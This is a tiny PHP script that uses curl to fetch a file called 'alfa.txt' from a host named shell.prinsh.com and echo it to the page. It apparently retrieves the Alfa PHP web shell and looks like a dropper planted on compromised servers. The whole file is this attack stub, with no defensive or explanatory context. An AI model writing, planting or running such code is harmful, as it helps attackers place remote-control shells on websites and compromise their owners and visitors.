<?php $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://shell.prinsh.com/Nathan/alfa.txt");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);
echo $output;
?>
